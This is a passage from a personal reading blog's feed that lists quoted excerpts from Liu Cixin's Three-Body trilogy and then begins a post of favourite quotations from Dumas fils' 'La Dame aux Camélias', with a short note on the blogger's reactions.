&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;于是罗辑照白蓉说的做了，完全抛开自己要写的内容，去想象她的整个人生，想象她人生中的每一个细节。他想象她在妈妈的怀中吃奶，小嘴使劲吮着，发出满意的晤晤声；想象雨中漫步的她突然收起了伞，享受着和雨丝接触的感觉；想象她追一个在地上滚的红色气球，仅追了一步就摔倒了，看着远去的气球哇哇大哭。完全没有意识到她刚才迈出的是人生的第一步；想象她上小学的第一天，孤独地坐在陌生教室的第三排，从门口和窗子都看不到爸爸妈妈了，就在她要哭出来时，发现邻桌是幼儿同的同学，高兴地叫起来；想象大学的第一个夜晚，她躺在宿舍的上铺，看着路灯投在天花板上的树影罗辑想象出她爱吃的每一样东西，想象她的衣橱中每一件衣服的颜色和样式，想象她手机上的小饰物，想象她看的书她的MP4中的音乐她上的网站她喜欢的电影，但从未想象过她用什么化妆品，她不需要化妆品罗辑像一个时间之上的创造者，同时在她生命中的不同时空编织着她的人生。他渐渐对这种创造产生了兴趣，乐此不疲。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一天在图书馆，罗辑想象她站在远处的一排书架前看书，他为她选了他最喜欢的那一身衣服，只是为了使她的娇小身材在自己的印象中更清晰一些。突然，她从书上抬起头来，远远地看了他一眼，冲他笑了一下。&lt;br /&gt;
　　罗辑很奇怪，我没让她笑啊？可那笑容已经留在记忆中，像冰上的水渍，永远擦不掉了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;真正的转机发生在第二天夜里。这天晚上风雪交加，气温骤降，在温暖的宿舍里，罗辑听着外面狂风怒号，盖住了城市中的其他声音，打在玻璃上的雪花像沙粒般啪啪作响，向外看一眼也只见一片雪尘。这时，城市似乎已经不存在了，这幢教工宿舍楼似乎是孤立在无际的雪原上。罗辑躺回床上，进入梦乡前突然有了一个想法：这鬼天气，她要是在外面走路该多冷啊。他接着安慰自己：没关系。&lt;br /&gt;
　　你不让她在外面她就不在外面了。但这次他的想象失败了，她仍在外面的风雪中行走着，像一株随时都会被寒风吹走的小草，她穿着那件白色的大衣，围着那条红色的围巾，飞扬的雪尘中也只能隐约看到红围巾，像在风雪中挣扎的小火苗。&lt;br /&gt;
　　罗辑再也不可能人睡了，他起身坐在床上，后来又披衣坐到沙发上，本来想抽烟的，但想起她讨厌烟味，就冲了一杯咖啡慢慢地喝着。他必须等她，外面的寒夜和风雩揪着他的心，他第一次如此心疼一个人，如此想念一个人。&lt;br /&gt;
　　就在他的思念像火一样燃烧起来时，她轻轻地来了，娇小的身躯裹着一层外面的寒气，清凉中却有股春天的气息；她刘海上的雪花很快融成晶莹的水珠。她解开红围巾，把双手放在嘴边呵着。他握住她纤细的双手，温暖着这冰凉的柔软，她激动地看着他，说出了他本想问候她的话：你还好吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;雪后朝阳般的微笑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“晚霞消失后可以看星星，朝霞消失后，就只剩下...... ” &lt;br /&gt;
“只剩下光天化日下的现实了。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;文学家无法控制这些人物，甚至无法预测他们下一步的行为，只是好奇地跟着他们，像偷窥狂一般观察 
他们生活中最细微的部分，记录下来，就成为了经典&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;去哪儿不重要，我觉得人在旅途中，感觉就很美呢&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他第一次体会到没有目的地的出行所带来的那种美妙的自由&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不不，别说在哪儿！一知道在哪儿，世界就变得像一张地图那么小了；不知道在哪儿，感觉世界才广阔呢&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;罗辑停了车，和她下车来到田边，看着几只喜鹊在地里觅食，直到他们走得很近了它们才飞到远处的树上。接着，他们下到一条几乎干涸的河床里，只在河床中央有一条窄窄的水流，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这里的山像坐在村头晒太阳的老头儿们。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他被一种从未有过的柔情所淹没，感觉自己和这篝火一样，活着的唯一目的就是给她带来温暖。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“我希望你说有狼的。”她甜甜地笑着，看着大群的火星向夜空中的星星飞去。&lt;br /&gt;
　　“好吧，有狼，但有我。”&lt;br /&gt;
　　然后他们再也没有说话，在火边默默地坐着，不时把一把秸秆放进火堆中维持着它的燃烧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不是的，大部分人的爱情对象也只是存在于自己的想象之中。他们所爱的并不是现实中的她(他)，而只是想象中的她(他)，现实中的她(他)只是他们创造梦中情人的一个模板，他们迟早会发现梦中情人与模板之间的差异，如果适应这种差异他们就会走到一起，无法适应就分开，就这么简单。你与大多数人的区别在于：你不需要模板。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这个罗辑用自己思想的肋骨造出的夏娃，坐在古老的壁炉前，静静地看着跳动的火焰&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那些大人物筑起的堤坝和挖出的河道真的决定了历史的走向&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;面壁者所承担的，将是人类历史上最艰难的使命，他们是真正的独行者，将对整个世界甚至整个宇宙，彻底关闭自己的心灵，他们所能倾述和交流的、他们在精神上唯一的依靠，只有他们自己&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;技术的最终受益者将是小国家。大国不遗余力发展技术，实际上是为小国通向世界霸权铺下基石。因为随着技术的发展，大国所拥有的人口和资源优势将不再重要，而技术对小国而言是一个可能撬动地球的杠杆。核技术的后果之一就是使一个人口只有几百万的小国有可能对一个人口过亿的大国产生实质性威胁，而在核技术出现之前，这几乎是不可能的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这种使命在被交付前，是不可能向要承担它的人征求意见的；而面壁者的使命和身份一旦被赋予，也不可能拒绝或放弃。这种不可能并非来自于谁的强制，而是一个由面壁计划的本质所决定的冷酷逻辑，因为当一个人成为面壁者后，一层无形的不可穿透的屏障就立刻在他与普通人之间建立起来，他的一切行为就具有了面壁计划的意义，正像那对面壁者的微笑所表达的含义：我们怎么知道您是不是已经在工作了？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;面壁者是历史上从未有过的最诡异的使命，它的逻辑冷酷而变态，但却像锁住普罗米修斯的铁环般坚固无比&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;社会上最可怜的那类人，他们的可怜之处不仅仅在于物质上，更多是精神上的卑微，就像果戈理笔下的那些小职员。虽然社会地位已经很低下，却仍然为保住这种地位而忧心忡忡，一辈子在毫无创造性的繁杂琐事中心力交瘁，成天小心谨慎，做每件事都怕出错，对每个人都怕惹得不高兴，更是不敢透过玻璃天花 板向更高的社会阶层望上一眼&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;外部世界也许真的是一种类似于量子态的东西，他不观察就不存在&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你们政治家动辄奢谈全人类，但我看不到全人类，我看到的是一个一个的人。我就是一个人，一个普通人，担负不起拯救全人类的责任，只希望过自己的生活&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;老师曾告诉过他一个语文考试的经验：先看卷子最后的作文题，然后再接顺序答卷，这样在答卷过程中，会下意识地思考作文题，很像电脑中后台执行的程序。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不要轻视简单，简单意味着坚固，整个数学大厦，都是建立在这种简单到不能再简单，但在逻辑上坚如磐石的公理的基础上。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;章北海一眼就看出他属于那样一类幸运的人，有自己钟爱的小世界，不管大世界怎样变化都能沉浸其中自得其乐&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;夕照下的海洋像一面光滑的镜子，一半深蓝一半橘红，而浸透了阳光的云层像一大片覆盖在镜面上的粉红色羽毛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这就够了，技术已经做到了能像修改计算机程序那样修改思想，这样被修改后的人，是算人呢，还是自动机器？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;所谓控制，必然存在控制者和被控制者，假如有人自愿在自己的意识中打上思想钢印，请问这能被称为控制吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;把你们绝望的人，你们迷茫的人，把你们渴望看到胜利之光的畏惧徘徊的人都给我/把那些精神失落、灵魂在流浪的人都送来/在这金色的信念旁，我要为他们把灯举起。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;唯一不可阻挡的是时间，它像一把利刃，无声地切开了坚硬和柔软的一切，恒定地向前推进着，没有任何东西能够使它的行进产生丝毫颠簸，它却改变着一切。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有黑暗，至少意味着出现了空间。很快，黑暗的空间中出现了一些扰动，像穿透一切的微风，这是时间流逝的感觉。之前的虚无是没有时间的，现在时间也出现了，像消融的冰河。光的出现是在很长时间以后，开始，只是一片没有形状的亮斑，又经过了很漫长的等待&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;给岁月以文明，而不是给文明以岁月。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;世界在被技术复杂化后，正在重新变得简洁起来，技术被深深地隐藏在现实的后面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我信奉哥德的说法：我爱你，与你有何相干？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他想到，宇宙很可能也是全息的，每一点都拥有全部，即使有一个原子留下来，就留下了宇宙的一切。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然他们不是魔鬼，问题也没有解决。因为他们也不知道我们怎么想。那么，假设他们也知道我们不是魔鬼。问题仍在。他们不知道我们是怎样想他们。他们不知道我们是怎样想他们怎样想我们。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;像坐在村头晒太阳的老头们&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从宇宙的时间尺度上看，这根本不是什么发展，是爆炸！技术飞跃的可能性是埋藏在每个文明内部的炸药&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;黑暗在寂静中变得如沥青般黏稠，把夜空和沙漠糊成一体&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;宇宙就是一座黑暗森林，每个文明都是带枪的猎人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;要想逃避现实，最好的方式就是深深介入现实之中&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这个仍未醒来的世界，不知道自己已被当做一场豪赌的筹码，放到了宇宙的赌桌上。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;生命比岩石和金属都强壮得多，比飓风和火山更有力&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那时他真希望夜风转个方向，那样她的长发就能拂到他的面庞上&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;包括所有活着的女孩和所有死去的公主，因为可以肯定，她是人类历史上第一个得到一颗星星的姑娘。试问，对于一个女人，还有什么比爱她的人送她一颗星星更幸福呢？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他没有任何解脱的可能，他没有手和身体，咬舌自杀都不可能，他的大脑就像一节电池，一遍遍地被充人痛苦的电流，绵绵无期，永无止境&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;哦，还有一个惊喜：你的那颗星星是他送的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我没有太多可说的，只有一个警告：生命从海洋登上陆地是地球生物进化的一个里程碑，但那些上岸的鱼再也不是鱼了；同样，真正进入太空的人，再也不是人了。所以，人们，当你们打算飞向外太空再也不回头时，请千万慎重，需付出的代价比你们想象的要大得多。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她浅浅一笑，如微风吹皱一汪春水，水中的阳光细碎轻柔地荡漾开来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;让人觉得马桶不通了他都能用心理学理论加以分析&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;潜意识中的世界图像是物质的和实体的；但在远离太阳系的外太空中，星星只是遥远的光点，银河系也只是一片发光的薄雾，从感官和心理上，世界已经失去了质量和实体感，空间主宰了一切，于是，航行者潜意识中的世界图像由物质的变成了虚空的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在这场积木游戏中，产生这样自我复制的分子链的几率如此之小，如同一阵龙卷风卷起一堆金属垃圾，落下后就组装成一辆奔驰车一般。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;其中有所有普通人的眼睛，也有达·芬奇、莎士比亚和爱因斯坦的眼睛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;按动开关，三十五亿年的进程将中止，一切都将消失在宇宙的漫漫长夜中，像从未存在过一样。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这些最后的幸运儿并不在意人们的唾沫和鄙夷的目光，因为他们知道，那些吐唾沫的人中相当一部分是提交过申请的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这个类比，其实也只是进一步描述了四维感觉的不可描述&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从一个方向上，他们可以像在三维世界里一样握住别人的手而不是抓住里面的骨头；要触到骨头或内脏，则需从另一个方向，那是一个在三维空间中不存在的方向&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;方寸之间，深不见底啊&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;四维空间包含三维空间，就像三维包含二维一样，要比喻的话，我们现在就处于四维空间中的一张三维的纸片上&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们是飘到四维中的三维扁片人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;三维本身就意味着脆弱，从四维看去，它不过是一张展开的图纸而已，毫无防御能力，可以从四维接近它，不需要知道它的原理，只需在它的内部，哦，对四维来说全是外部，随意破坏就行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们不可能把模糊的、多义的信息作为战略方向，但模糊性和多义性恰恰是文学作品语境的特点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们将面临的困难，不是从这三个故事中解读不出信息，而是可能的解读太多了，但哪个都是不确定的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;云天明的故事对他们来说已经变成了类似于《圣经》的东西，不知不觉中，他们从中寻找的已不再是真实的战略情报，而是某种对现实的慰藉。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这种模式是用于解决文字语言所产生的信息不确定性的问题。在一个双层隐喻完成后，附加一个单层隐喻，用来固定双层隐喻的含义。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在那山的顶上看月亮是最美的景致&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;毁灭一词并不准确，没有真正毁掉什么，更没有灭掉什么，物质总量一点不少都还在，角动量也还在，只是物质的组合方式变了变，像一副扑克牌，仅仅重洗而已……可生命是一手同花顺，一洗什么都没了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;每座太空城都带有一个或多个标准接口，可以相互对接组合，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但维德本人并非卓越的企业家，要论公司经营，他可能连艾AA都不如，这些发展都是由他重新创建的经营团队实现的，他对公司的经营没有太多介入，也不感兴趣&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;知道初始条件就可以计算出以后任何时间断面的状态&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;难道制造假象的只有智子？难道假象只存在于加速器末端？难道宇宙的其他部分都像处女一样纯真，等着我们去探索？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但最后发现，真正的力量在时间手里，留下脚印比创造世界更难，在这文明的尽头，他们也只能做远古的婴儿时代做过的事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;凡·高对空间的表现，在他的潜意识中，空间肯定是有结构的。程心当时对理论物理知道得不多，但知道按照弦论，空间与实体一样，也是由无数振动着的微弦构成的，而凡·高画出了这些弦。在他的画中，空间与山、麦田、房屋和树一样，也充满了细微的躁动，给她印象最深的就是《星空》。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;就像你在地面上做一个倒立，就认为自己举起了地球一样。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;太阳系人类很可怜，直到最后，大多数人也只是在那一小块时空中生活过，就像公元世纪那些一辈子都没有走出过山村的老人，宇宙对他们仍然是个谜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那些拥有神一般技术力量的参战文明，都毫不犹豫地把宇宙规律作为战争武器。能够作为武器的规律有很多，最常用的是空间维度和光速，一般是把降低维度用来攻击，降低光速用于防御。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;攻击者首先改造自己，把自己改造成低维生命，比如由四维生命改造成三维生命，当然也可以由三维改造成二维，当整个文明进入低维后，就向敌人发起维度打击，肆无忌惮，在超大规模上疯狂攻击，不需要任何顾忌。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;把海弄干的鱼在海干前上了陆地，从一片黑暗森林奔向另一片黑暗森林&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;为了战争的胜利，竟要付出这样的代价吗？”程心说，她很难想象在降低一个维度的空间中生活是什么样子，在二维空间中，世界万物看上去只是几根长短不一的线段，在三维世界生活过的人，真的可能使自己生活在一张没有厚度的薄纸里吗？当然，三维空间的生活对四维世界的人来说也同样无法想象&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;描述那个没有被战争改变的宇宙。那真是一个美丽的田园，那个时代，距今有一百多亿年吧，被称为宇宙的田园时代。当然，那种美只能用数学来描述，我们不可能想象出那时的宇宙，我们大脑的维度不够&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;爱是没错的，一个人不可能毁灭一个世界，如果这个世界毁灭了，那是所有人，包括活着的和逝去的，共同努力的结果&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那很好，知道吗？我唯一怕的就是你会怕&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于智慧文明来说，它们最后总变得和自己的思想一样大。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 19 Feb 2015 00:00:00 +0000</pubDate><guid>tag:,2015-02-19:san-ti.html</guid><category>book</category></item><item><title>茶花女</title><link>/book-La-traviata.html</link><description>&lt;p&gt;------摘自小仲马《茶花女》&lt;/p&gt;
&lt;p&gt;好友推荐的一本书，我俩都爱极了这本书，看完后我同她说，阅读这本书这是我今年干过最重要的事情之一了。为表谢意，我有种想学张无忌承诺赵敏办到三件事的冲动...就算摘星星我也愿意试试的。&lt;/p&gt;
&lt;p&gt;我俩都快看哭那种，虽然我极力狡辩我只是鼻子发酸&lt;/p&gt;
&lt;p&gt;书中的许多话，真是睿智又刻薄极了，看得又好笑又心疼&lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是我对烟花女子总是无限宽容的，甚至也不想为这种宽容态度与人争辩。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;皮肤颜色就像未经人手触摸过的蜜桃上的绒衣&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我从玛侬和玛格丽特，转而想到了我所认识的那些女人，我看着她们一边唱歌，一边走向那几乎总是千篇一律的最后归宿。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一条是痛苦，一条是爱情。这两条路走起来都十分艰难。那些女人在上面走得两脚流血，两手破裂；但与此同时，她们把罪孽的盛装留在沿途的荆棘上，赤条条地抵达旅途的尽头，而这样全身赤裸地来到天主跟前，是用不着脸红的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一旦有人在您面前提到他的姓名，跟这个人有关的各种琐闻就会慢慢地汇集拢来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;本来我很想为这个女人受苦，我担心她过快地接受我，怕她过于匆忙地爱上我；我宁愿经过长期等待，历尽艰辛以后才得到这种爱情。我们这些男人就是这种脾气；如果能使我们头脑里的想象赋有一点诗意，灵魂里的幻想高于肉欲，那就会感到无比的幸福。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;总之，如果有人对我说：“今天晚上您可以得到这个女人，但是明天您就会被人杀死。”我会接受的。如果有人对我说：“花上十个路易，您就可以做她的情夫。”我会拒绝的，而且会痛哭一场，就像一个孩子在醒来时发现夜里梦见的宫殿城堡化为乌有一样。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这就像替狗洒香水一样，它们总觉得味道难闻，要跑到水沟里去打滚洗掉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;再说像我这样的姑娘，多一个少一个又有什么关系呢？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们简直是在讲孩子话。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;年轻的母亲在听她们的孩子讲傻话时常带着这种微笑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们一起谈谈笑笑，但是用不着过分看重我，因为我是分文不值的。您心肠真好，您需要爱情。但是要在我们这个圈子里生活，您还太年轻，也太容易动感情，您还是去找个有夫之妇做情妇吧。您看，我是个多好的姑娘，我跟您说话有多坦率&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这种既有快乐，又有悲伤，既有纯洁，又有淫欲的混合物&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;时间一长，他们又会感到不满足了，他们进而要求了解他们情人的目前、过去、甚至将来的情况。在他们逐渐跟情人熟悉以后，就想控制她，情人越迁就，他们就越得寸进尺。倘使我现在打定主意要再找一个情人的话，我希望他具有三种罕见的品格：信任我，听我的话，而且不多嘴。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我还经常听说玛格丽特的爱情就像商品一样，价格随着季节不同而涨落&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我感到自己的房间似乎太小，怎么也容纳不下我的幸福，我需要向整个大自然倾诉衷肠。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我一点也记不得这一天剩下来的时间是怎么过的；我散步、抽烟、跟人聊天，但是，到了晚上十点钟，我一点儿也记不起那天晚上遇到过什么人，讲过些什么话。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;春末夏初&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
